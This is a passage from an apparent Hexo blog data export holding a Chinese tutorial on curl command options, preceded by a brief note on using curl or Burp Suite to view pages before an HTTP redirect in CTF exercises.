title=\"对于耗时请求的临时响应\"></a>对于耗时请求的临时响应</h3><p>一些请求的处理会需要比较长的时间，比如有时候 DELETE 请求会被安排为稍后处理。在这种情况下，会返回一个 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303\" target=\"_blank\" rel=\"noopener\"><code>303</code></a> (See Other)  重定向响应，该响应链接到一个页面，表示请求的操作已经被列入计划，并且最终会通知用户操作的进展情况，或者允许用户将其取消。</p>\n<h2 id=\"在CTF中的应用\"><a href=\"#在CTF中的应用\" class=\"headerlink\" title=\"在CTF中的应用\"></a>在CTF中的应用</h2><h3 id=\"使用curl工具\"><a href=\"#使用curl工具\" class=\"headerlink\" title=\"使用curl工具\"></a>使用curl工具</h3><p>如果需要获得跳转前的页面中的信息，使用curl命令行工具是非常常见的，因为curl默认是不跟随跳转的，除非添加了-L参数才会跟随跳转。</p>\n<h3 id=\"使用bp抓包\"><a href=\"#使用bp抓包\" class=\"headerlink\" title=\"使用bp抓包\"></a>使用bp抓包</h3><p>这个方法也很简单，抓包，放入Repeater模块，发送过去就行了，它会把服务器发过来的包都截下来的，因为重定向是由浏览器执行的，所以信息都仍然保留在服务器回复的报文里。</p>\n"},{"layout":"post","title":"curl命令参数和用法","date":"2021-01-10T16:00:00.000Z","description":"详解curl命令参数和用法","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# curl命令参数和用法\n\ncurl即“客户端（client）的url工具”，是一种非常常用的命令行工具，用于请求服务端资源。\n\n## 不带参数(查看源代码)\n\n不带有任何参数时，curl 就是发出 GET 请求。\n\n> ```bash\n> $ curl https://www.example.com\n> ```\n\n```\n　　<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n　　<html><head>\n　　<title>301 Moved Permanently</title>\n　　</head><body>\n　　<h1>Moved Permanently</h1>\n　　<p>The document has moved <a href=\"http://www.example.com.cn/\">here</a>.</p>\n　　</body></html>\n```\n\n如果要把这个网页保存下来，可以使用`-o`参数，这就相当于使用**wget**命令了。\n\n> ```bash\n> $ curl -o [文件名] www.example.com\n> ```\n\n## 关于报头或响应信息\n\n## **-A**\n\n`-A`参数指定客户端的用户代理标头，即`User-Agent`。curl 的默认用户代理字符串是`curl/[version]`。\n\n> ```bash\n> $ curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com\n> ```\n\n上面命令将`User-Agent`改成 Chrome 浏览器。\n\n> ```bash\n> $ curl -A '' https://google.com\n> ```\n\n上面命令会移除`User-Agent`标头。\n\n## **-H**\n\n`-H`参数添加 HTTP 请求的标头。\n\n> ```bash\n> $ curl -H 'Accept-Language: en-US' https://google.com\n> ```\n\n上面命令添加 HTTP 标头`Accept-Language: en-US`。\n\n> ```bash\n> $ curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com\n> ```\n\n上面命令添加两个 HTTP 标头。\n\n> ```bash\n> $ curl -d '{\"login\": \"emma\", \"pass\": \"123\"}' -H 'Content-Type: application/json' https://google.com/login\n> ```\n\n上面命令添加 HTTP 请求的标头是`Content-Type: application/json`，然后用`-d`参数发送 JSON 数据。\n\n## **-d**\n\n`-d`参数用于发送 POST 请求的数据体。\n\n> ```bash\n> $ curl -d'login=emma＆password=123'-X POST https://google.com/login\n> # 或者\n> $ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login\n> ```\n\n使用`-d`参数以后，HTTP 请求会自动加上标头`Content-Type : application/x-www-form-urlencoded`。并且会自动将请求转为 POST 方法，因此可以省略`-X POST`。\n\n`-d`参数可以读取本地文本文件的数据，向服务器发送。\n\n> ```bash\n> $ curl -d '@data.txt' https://google.com/login\n> ```\n\n上面命令读取`data.txt`文件的内容，作为数据体向服务器发送。\n\n## **--data-urlencode**\n\n`--data-urlencode`参数等同于`-d`，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。\n\n> ```bash\n> $ curl --data-urlencode 'comment=hello world' https://google.com/login\n> ```\n\n上面代码中，发送的数据`hello world`之间有一个空格，需要进行 URL 编码。\n\n## -i\n\n`-i`参数可以显示http response的头信息，连同网页代码一起。\n\n> ```bash\n> $ curl -i https://www.example.com                                                                                                                                                                                                  130 ↵\n> HTTP/2 200 \n> accept-ranges: bytes\n> age: 551684\n> cache-control: max-age=604800\n> content-type: text/html; charset=UTF-8\n> date: Mon, 11 Jan 2021 13:43:15 GMT\n> etag: \"3147526947+ident\"\n> expires: Mon, 18 Jan 2021 13:43:15 GMT\n> last-modified: Thu, 17 Oct 2019 07:18:26 GMT\n> server: ECS (sjc/4E74)\n> vary: Accept-Encoding\n> x-cache: HIT\n> content-length: 1256\n> \n> <!doctype html>\n> <html>\n> <head>\n>     <title>Example Domain</title>\n> \n>     <meta charset=\"utf-8\" />\n>     <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n>     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n>     <style type=\"text/css\">\n>     body {\n>         background-color: #f0f0f2;\n>         margin: 0;\n>         padding: 0;\n>         font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n>         \n>     }\n>     div {\n>         width: 600px;\n>         margin: 5em auto;\n>         padding: 2em;\n>         background-color: #fdfdff;\n>         border-radius: 0.5em;\n>         box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n>     }\n>     a:link, a:visited {\n>         color: #38488f;\n>         text-decoration: none;\n>     }\n>     @media (max-width: 700px) {\n>         div {\n>             margin: 0 auto;\n>             width: auto;\n>         }\n>     }\n>     </style>    \n> </head>\n> \n> <body>\n> <div>\n>     <h1>Example Domain</h1>\n>     <p>This domain is for use in illustrative examples in documents. You may use this\n>     domain in literature without prior coordination or asking for permission.</p>\n>     <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n> </div>\n> </body>\n> </html>\n> ```\n\n## **-I**\n\n`-I`参数则是只显示http response的头信息。\n\n## **-k**\n\n`-k`参数指定跳过 SSL 检测。\n\n> ```bash\n> $ curl -k https://www.example.com\n> ```\n\n上面命令不会检查服务器的 SSL 证书是否正确。\n\n## **-L**\n\n`-L`参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。\n\n> ```bash\n> $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet\n> ```\n\n## **-s**\n\n`-s`参数将不输出错误和进度信息。\n\n> ```bash\n> $ curl -s https://www.example.com\n> ```\n\n上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。\n\n如果想让 curl 不产生任何输出，可以使用下面的命令。\n\n> ```bash\n> $ curl -s -o /dev/null https://google.com\n> ```\n\n## **-S**\n\n`-S`参数指定只输出错误信息，通常与`-o`一起使用。\n\n> ```bash\n> $ curl -s -o /dev/null https://google.com\n> ```\n\n上面命令没有任何输出，除非发生错误。\n\n## **-v**\n\n`-v`参数输出通信的整个过程，用于调试。\n\n> ```bash\n> $ curl -v https://www.example.com\n> ```\n\n`--trace`参数也可以用于调试，还会输出原始的二进制数据。\n\n> ```bash\n> $ curl --trace - https://www.example.com\n> ```\n\n## **-e**\n\n`-e`参数用来设置 HTTP 的标头`Referer`，表示请求的来源。\n\n> ```bash\n> curl -e 'https://google.com?q=example' https://www.example.com\n> ```\n\n上面命令将`Referer`标头设为`https://google.com?q=example`。\n\n`-H`参数可以通过直接添加标头`Referer`，达到同样效果。\n\n> ```bash\n> curl -H 'Referer: https://google.com?q=example' https://www.example.com\n> ```\n\n## **-x**\n\n`-x`参数指定 HTTP 请求的代理。\n\n> ```bash\n> $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com\n> ```\n\n上面命令指定 HTTP 请求通过`myproxy.com:8080`的 socks5 代理发出。\n\n如果没有指定代理协议，默认为 HTTP。\n\n> ```bash\n> $ curl -x james:cats@myproxy.com:8080 https://www.example.com\n> ```\n\n上面命令中，请求的代理使用 HTTP 协议。\n\n## **-X**\n\n`-X`参数指定 HTTP 请求的方法。\n\n> ```bash\n> $ curl -X POST https://www.example.com\n> ```\n\n上面命令对`https://www.example.com`发出 POST 请求。\n\n## 写入（上传）或保存（下载）文件或信息\n\n## **-o**\n\n`-o`参数将服务器的回应保存成文件，等同于`wget`命令。\n\n> ```bash\n> $ curl -o example.html https://www.example.com\n> ```\n\n上面命令将`www.example.com`保存成`example.html`。\n\n## **-O**\n\n`-O`参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。\n\n> ```bash\n> $ curl -O https://www.example.com/foo/bar.html\n> ```\n\n上面命令将服务器回应保存成文件，文件名为`bar.html`。\n\n## **-b**\n\n`-b`参数用来向服务器发送 Cookie。\n\n> ```bash\n> $ curl -b 'foo=bar' https://google.com\n> ```\n\n上面命令会生成一个标头`Cookie: foo=bar`，向服务器发送一个名为`foo`、值为`bar`的 Cookie。\n\n> ```bash\n> $ curl -b 'foo1=bar;foo2=bar2' https://google.com\n> ```\n\n上面命令发送两个 Cookie。\n\n> ```bash\n> $ curl -b cookies.txt https://www.google.com\n> ```\n\n上面命令读取本地文件`cookies.txt`，里面是服务器设置的 Cookie（参见`-c`参数），将其发送到服务器。\n\n## **-c**\n\n`-c`参数将服务器设置的 Cookie 写入一个文件。\n\n> ```bash\n> $ curl -c cookies.txt https://www.google.com\n> ```\n\n上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件`cookies.txt`。\n\n## **-d**\n\n`-d`参数用于发送 POST 请求的数据体。\n\n> ```bash\n> $ curl -d'login=emma＆password=123'-X POST https://google.com/login\n> # 或者\n> $ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login\n> ```\n\n使用`-d`参数以后，HTTP 请求会自动加上标头`Content-Type : application/x-www-form-urlencoded`。并且会自动将请求转为 POST 方法，因此可以省略`-X POST`。\n\n`-d`参数可以读取本地文本文件的数据，向服务器发送。\n\n> ```bash\n> $ curl -d '@data.txt' https://google.com/login\n> ```\n\n上面命令读取`data.txt`文件的内容，作为数据体向服务器发送。\n\n## **--data-urlencode**\n\n`--data-urlencode`参数等同于`-d`，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。\n\n> ```bash\n> $ curl --data-urlencode 'comment=hello world' https://google.com/login\n> ```\n\n上面代码中，发送的数据`hello world`之间有一个空格，需要进行 URL 编码。\n\n## **-F**\n\n`-F`参数用来向服务器上传二进制文件。\n\n> ```bash\n> $ curl -F 'file=@photo.png' https://google.com/profile\n> ```\n\n上面命令会给 HTTP 请求加上标头`Content-Type: multipart/form-data`，然后将文件`photo.png`作为`file`字段上传。\n\n`-F`参数可以指定 MIME 类型。\n\n> ```bash\n> $ curl -F 'file=@photo.png;type=image/png' https://google.com/profile\n> ```\n\n上面命令指定 MIME 类型为`image/png`，否则 curl 会把 MIME 类型设为`application/octet-stream`。\n\n`-F`参数也可以指定文件名。\n\n> ```bash\n> $ curl -F 'file=@photo.png;filename=me.png' https://google.com/profile\n> ```\n\n上面命令中，原始文件名为`photo.png`，但是服务器接收到的文件名为`me.png`。\n\n## **-G**\n\n`-G`参数用来构造 URL 的查询字符串。\n\n> ```bash\n> $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search\n> ```\n\n上面命令会发出一个 GET 请求，实际请求的 URL 为`https://google.com/search?q=kitties&count=20`。如果省略`--G`，会发出一个 POST 请求。\n\n如果数据需要 URL 编码，可以结合`--data--urlencode`参数。\n\n> ```bash\n> $ curl -G --data-urlencode 'comment=hello world' https://www.example.com\n> ```\n\n## **-u**\n\n`-u`参数用来设置服务器认证的用户名和密码。\n\n> ```bash\n> $ curl -u 'bob:12345' https://google.com/login\n> ```\n\n上面命令设置用户名为`bob`，密码为`12345`，然后将其转为 HTTP 标头`Authorization: Basic Ym9iOjEyMzQ1`。\n\ncurl 能够识别 URL 里面的用户名和密码。\n\n> ```bash\n> $ curl https://bob:12345@google.com/login\n> ```\n\n上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。\n\n> ```bash\n> $ curl -u 'bob' https://google.com/login\n> ```\n\n上面命令只设置了用户名，执行后，curl 会提示用户输入密码。","source":"_posts/2021-1-11-curl命令参数和用法.md","raw":"---\nlayout: post\ntitle: curl命令参数和用法\ndate: 2021-1-11\ncategories: blog\ntags: [web,命令]\ndescription: 详解curl命令参数和用法\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# curl命令参数和用法\n\ncurl即“客户端（client）的url工具”，是一种非常常用的命令行工具，用于请求服务端资源。\n\n## 不带参数(查看源代码)\n\n不带有任何参数时，curl 就是发出 GET 请求。\n\n> ```bash\n> $ curl https://www.example.com\n> ```\n\n```\n　　<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n　　<html><head>\n　　<title>301 Moved Permanently</title>\n　　</head><body>\n　　<h1>Moved Permanently</h1>\n　　<p>The document has moved <a href=\"http://www.example.com.cn/\">here</a>.</p>\n　　</body></html>\n```\n\n如果要把这个网页保存下来，可以使用`-o`参数，这就相当于使用**wget**命令了。\n\n> ```bash\n> $ curl -o [文件名] www.example.com\n> ```\n\n## 关于报头或响应信息\n\n## **-A**\n\n`-A`参数指定客户端的用户代理标头，即`User-Agent`。curl 的默认用户代理字符串是`curl/[version]`。\n\n> ```bash\n> $ curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com\n> ```\n\n上面命令将`User-Agent`改成 Chrome 浏览器。\n\n> ```bash\n> $ curl -A '' https://google.com\n> ```\n\n上面命令会移除`User-Agent`标头。\n\n## **-H**\n\n`-H`参数添加 HTTP 请求的标头。\n\n> ```bash\n> $ curl -H 'Accept-Language: en-US' https://google.com\n> ```\n\n上面命令添加 HTTP 标头`Accept-Language: en-US`。\n\n> ```bash\n> $ curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com\n> ```\n\n上面命令添加两个 HTTP 标头。\n\n> ```bash\n> $ curl -d '{\"login\": \"emma\", \"pass\": \"123\"}' -H 'Content-Type: application/json' https://google.com/login\n> ```\n\n上面命令添加 HTTP 请求的标头是`Content-Type: application/json`，然后用`-d`参数发送 JSON 数据。\n\n## **-d**\n\n`-d`参数用于发送 POST 请求的数据体。\n\n> ```bash\n> $ curl -d'login=emma＆password=123'-X POST https://google.com/login\n> # 或者\n> $ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login\n> ```\n\n使用`-d`参数以后，HTTP 请求会自动加上标头`Content-Type : application/x-www-form-urlencoded`。并且会自动将请求转为 POST 方法，因此可以省略`-X POST`。\n\n`-d`参数可以读取本地文本文件的数据，向服务器发送。\n\n> ```bash\n> $ curl -d '@data.txt' https://google.com/login\n> ```\n\n上面命令读取`data.txt`文件的内容，作为数据体向服务器发送。\n\n## **--data-urlencode**\n\n`--data-urlencode`参数等同于`-d`，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。\n\n> ```bash\n> $ curl --data-urlencode 'comment=hello world' https://google.com/login\n> ```\n\n上面代码中，发送的数据`hello world`之间有一个空格，需要进行 URL 编码。\n\n## -i\n\n`-i`参数可以显示http response的头信息，连同网页代码一起。\n\n> ```bash\n> $ curl -i https://www.example.com                                                                                                                                                                                                  130 ↵\n> HTTP/2 200 \n> accept-ranges: bytes\n> age: 551684\n> cache-control: max-age=604800\n> content-type: text/html; charset=UTF-8\n> date: Mon, 11 Jan 2021 13:43:15 GMT\n> etag: \"3147526947+ident\"\n> expires: Mon, 18 Jan 2021 13:43:15 GMT\n> last-modified: Thu, 17 Oct 2019 07:18:26 GMT\n> server: ECS (sjc/4E74)\n> vary: Accept-Encoding\n> x-cache: HIT\n> content-length: 1256\n> \n> <!doctype html>\n> <html>\n> <head>\n>     <title>Example Domain</title>\n> \n>     <meta charset=\"utf-8\" />\n>     <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n>     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n>     <style type=\"text/css\">\n>     body {\n>         background-color: #f0f0f2;\n>         margin: 0;\n>         padding: 0;\n>         font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n>         \n>     }\n>     div {\n>         width: 600px;\n>         margin: 5em auto;\n>         padding: 2em;\n>         background-color: #fdfdff;\n>         border-radius: 0.5em;\n>         box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n>     }\n>     a:link, a:visited {\n>         color: #38488f;\n>         text-decoration: none;\n>     }\n>     @media (max-width: 700px) {\n>         div {\n>             margin: 0 auto;\n>             width: auto;\n>         }\n>     }\n>     </style>    \n> </head>\n> \n> <body>\n> <div>\n>     <h1>Example Domain</h1>\n>     <p>This domain is for use in illustrative examples in documents. You may use this\n>     domain in literature without prior coordination or asking for permission.</p>\n>     <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n> </div>\n> </body>\n> </html>\n> ```\n\n## **-I**\n\n`-I`参数则是只显示http response的头信息。\n\n## **-k**\n\n`-k`参数指定跳过 SSL 检测。\n\n> ```bash\n> $ curl -k https://www.example.com\n> ```\n\n上面命令不会检查服务器的 SSL 证书是否正确。\n\n## **-L**\n\n`-L`参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。\n\n> ```bash\n> $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet\n> ```\n\n## **-s**\n\n`-s`参数将不输出错误和进度信息。\n\n> ```bash\n> $ curl -s https://www.example.com\n> ```\n\n上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。\n\n如果想让 curl 不产生任何输出，可以使用下面的命令。\n\n> ```bash\n> $ curl -s -o /dev/null https://google.com\n> ```\n\n## **-S**\n\n`-S`参数指定只输出错误信息，通常与`-o`一起使用。\n\n> ```bash\n> $ curl -s -o /dev/null https://google.com\n> ```\n\n上面命令没有任何输出，除非发生错误。\n\n## **-v**\n\n`-v`参数输出通信的整个过程，用于调试。\n\n> ```bash\n> $ curl -v https://www.example.com\n> ```\n\n`--trace`参数也可以用于调试，还会输出原始的二进制数据。\n\n> ```bash\n> $ curl --trace - https://www.example.com\n> ```\n\n## **-e**\n\n`-e`参数用来设置 HTTP 的标头`Referer`，表示请求的来源。\n\n> ```bash\n> curl -e 'https://google.com?q=example' https://www.example.com\n> ```\n\n上面命令将`Referer`标头设为`https://google.com?q=example`。\n\n`-H`参数可以通过直接添加标头`Referer`，达到同样效果。\n\n> ```bash\n> curl -H 'Referer: https://google.com?q=example' https://www.example.com\n> ```\n\n## **-x**\n\n`-x`参数指定 HTTP 请求的代理。\n\n> ```bash\n> $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com\n> ```\n\n上面命令指定 HTTP 请求通过`myproxy.com:8080`的 socks5 代理发出。\n\n如果没有指定代理协议，默认为 HTTP。\n\n> ```bash\n> $ curl -x james:cats@myproxy.com:8080 https://www.example.com\n> ```\n\n上面命令中，请求的代理使用 HTTP 协议。\n\n## **-X**\n\n`-X`参数指定 HTTP 请求的方法。\n\n> ```bash\n> $ curl -X POST https://www.example.com\n> ```\n\n上面命令对`https://www.example.com`发出 POST 请求。\n\n## 写入（上传）或保存（下载）文件或信息\n\n## **-o**\n\n`-o`参数将服务器的回应保存成文件，等同于`wget`命令。\n\n> ```bash\n> $ curl -o example.html https://www.example.com\n> ```\n\n上面命令将`www.example.com`保存成`example.html`。\n\n## **-O**\n\n`-O`参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。\n\n> ```bash\n> $ curl -O https://www.example.com/foo/bar.html\n> ```\n\n上面命令将服务器回应保存成文件，文件名为`bar.html`。\n\n## **-b**\n\n`-b`参数用来向服务器发送 Cookie。\n\n> ```bash\n> $ curl -b 'foo=bar' https://google.com\n> ```\n\n上面命令会生成一个标头`Cookie: foo=bar`，向服务器发送一个名为`foo`、值为`bar`的 Cookie。\n\n> ```bash\n> $ curl -b 'foo1=bar;foo2=bar2' https://google.com\n> ```\n\n上面命令发送两个 Cookie。\n\n> ```bash\n> $ curl -b cookies.txt https://www.google.com\n> ```\n\n上面命令读取本地文件`cookies.txt`，里面是服务器设置的 Cookie（参见`-c`参数），将其发送到服务器。\n\n## **-c**\n\n`-c`参数将服务器设置的 Cookie 写入一个文件。\n\n> ```bash\n> $ curl -c cookies.txt https://www.google.com\n> ```\n\n上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件`cookies.txt`。\n\n## **-d**\n\n`-d`参数用于发送 POST 请求的数据体。\n\n> ```bash\n> $ curl -d'login=emma＆password=123'-X POST https://google.com/login\n> # 或者\n> $ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login\n> ```\n\n使用`-d`参数以后，HTTP 请求会自动加上标头`Content-Type : application/x-www-form-urlencoded`。并且会自动将请求转为 POST 方法，因此可以省略`-X POST`。\n\n`-d`参数可以读取本地文本文件的数据，向服务器发送。\n\n> ```bash\n> $ curl -d '@data.txt' https://google.com/login\n> ```\n\n上面命令读取`data.txt`文件的内容，作为数据体向服务器发送。\n\n## **--data-urlencode**\n\n`--data-urlencode`参数等同于`-d`，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。\n\n> ```bash\n> $ curl --data-urlencode 'comment=hello world' https://google.com/login\n> ```\n\n上面代码中，发送的数据`hello world`之间有一个空格，需要进行 URL 编码。\n\n## **-F**\n\n`-F`参数用来向服务器上传二进制文件。\n\n> ```bash\n> $ curl -F 'file=@photo.png' https://google.com/profile\n> ```\n\n上面命令会给 HTTP 请求加上标头`Content-Type: multipart/form-data`，然后将文件`photo.png`作为`file`字段上传。\n\n`-F`参数可以指定 MIME 类型。\n\n> ```bash\n> $ curl -F 'file=@photo.png;type=image/png' https://google.com/profile\n> ```\n\n上面命令指定 MIME 类型为`image/png`，否则 curl 会把 MIME 类型设为`application/octet-stream`。\n\n`-F`参数也可以指定文件名。\n\n> ```bash\n> $ curl -F 'file=@photo.png;filename=me.png' https://google.com/profile\n> ```\n\n上面命令中，原始文件名为`photo.png`，但是服务器接收到的文件名为`me.png`。\n\n## **-G**\n\n`-G`参数用来构造 URL 的查询字符串。\n\n> ```bash\n> $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search\n> ```\n\n上面命令会发出一个 GET 请求，实际请求的 URL 为`https://google.com/search?q=kitties&count=20`。如果省略`--G`，会发出一个 POST 请求。\n\n如果数据需要 URL 编码，可以结合`--data--urlencode`参数。\n\n> ```bash\n> $ curl -G --data-urlencode 'comment=hello world' https://www.example.com\n> ```\n\n## **-u**\n\n`-u`参数用来设置服务器认证的用户名和密码。\n\n> ```bash\n> $ curl -u 'bob:12345' https://google.com/login\n> ```\n\n上面命令设置用户名为`bob`，密码为`12345`，然后将其转为 HTTP 标头`Authorization: Basic Ym9iOjEyMzQ1`。\n\ncurl 能够识别 URL 里面的用户名和密码。\n\n> ```bash\n> $ curl https://bob:12345@google.com/login\n> ```\n\n上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。\n\n> ```bash\n> $ curl -u 'bob' https://google.com/login\n> ```\n\n上面命令只设置了用户名，执行后，curl 会提示用户输入密码。","slug":"2021-1-11-curl命令参数和用法","published":1,"updated":"2021-01-14T10:16:46.172Z","comments":1,"photos":[],"link":"","_id":"ckkntx9kj002ixov777fhafmo","content":"<h1 id=\"curl命令参数和用法\"><a href=\"#curl命令参数和用法\" class=\"headerlink\" title=\"curl命令参数和用法\"></a>curl命令参数和用法</h1><p>curl即“客户端（client）的url工具”，是一种非常常用的命令行工具，用于请求服务端资源。</p>\n<h2 id=\"不带参数-查看源代码\"><a href=\"#不带参数-查看源代码\" class=\"headerlink\" title=\"不带参数(查看源代码)\"></a>不带参数(查看源代码)</h2><p>不带有任何参数时，curl 就是发出 GET 请求。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl https://www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<pre><code>　　&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n　　&lt;html&gt;&lt;head&gt;\n　　&lt;title&gt;301 Moved Permanently&lt;/title&gt;\n　　&lt;/head&gt;&lt;body&gt;\n　　&lt;h1&gt;Moved Permanently&lt;/h1&gt;\n　　&lt;p&gt;The document has moved &lt;a href=\"http://www.example.com.cn/\"&gt;here&lt;/a&gt;.&lt;/p&gt;\n　　&lt;/body&gt;&lt;/html&gt;</code></pre><p>如果要把这个网页保存下来，可以使用<code>-o</code>参数，这就相当于使用<strong>wget</strong>命令了。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -o <span class=\"token punctuation\">[</span>文件名<span class=\"token punctuation\">]</span> www.example.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<h2 id=\"关于报头或响应信息\"><a href=\"#关于报头或响应信息\" class=\"headerlink\" title=\"关于报头或响应信息\"></a>关于报头或响应信息</h2><h2 id=\"A\"><a href=\"#A\" class=\"headerlink\" title=\"-A\"></a><strong>-A</strong></h2><p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -A <span class=\"token string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'</span> https://google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令将<code>User-Agent</code>改成 Chrome 浏览器。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -A <span class=\"token string\">''</span> https://google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令会移除<code>User-Agent</code>标头。</p>\n<h2 id=\"H\"><a href=\"#H\" class=\"headerlink\" title=\"-H\"></a><strong>-H</strong></h2><p><code>-H</code>参数添加 HTTP 请求的标头。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -H <span class=\"token string\">'Accept-Language: en-US'</span> https://google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令添加 HTTP 标头<code>Accept-Language: en-US</code>。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -H <span class=\"token string\">'Accept-Language: en-US'</span> -H <span class=\"token string\">'Secret-Message: xyzzy'</span> https://google.com<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令添加两个 HTTP 标头。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -d <span class=\"token string\">'{\"login\": \"emma\", \"pass\": \"123\"}'</span> -H <span class=\"token string\">'Content-Type: application/json'</span> https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令添加 HTTP 请求的标头是<code>Content-Type: application/json</code>，然后用<code>-d</code>参数发送 JSON 数据。</p>\n<h2 id=\"d\"><a href=\"#d\" class=\"headerlink\" title=\"-d\"></a><strong>-d</strong></h2><p><code>-d</code>参数用于发送 POST 请求的数据体。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -d<span class=\"token string\">'login=emma＆password=123'</span>-X POST https://google.com/login\n<span class=\"token comment\" spellcheck=\"true\"># 或者</span>\n$ curl -d <span class=\"token string\">'login=emma'</span> -d <span class=\"token string\">'password=123'</span> -X POST  https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</blockquote>\n<p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p>\n<p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -d <span class=\"token string\">'@data.txt'</span> https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p>\n<h2 id=\"–data-urlencode\"><a href=\"#–data-urlencode\" class=\"headerlink\" title=\"–data-urlencode\"></a><strong>–data-urlencode</strong></h2><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl --data-urlencode <span class=\"token string\">'comment=hello world'</span> https://google.com/login<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</blockquote>\n<p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p>\n<h2 id=\"i\"><a href=\"#i\" class=\"headerlink\" title=\"-i\"></a>-i</h2><p><code>-i</code>参数可以显示http response的头信息，连同网页代码一起。</p>\n<blockquote>\n<pre class=\"line-numbers language-bash\"><code class=\"language-bash\">$ curl -i https://www.example.com                                                                                                                                                                                                  130 ↵\nHTTP/2 200 \naccept-ranges: bytes\nage: 551684\ncache-control: max-age<span 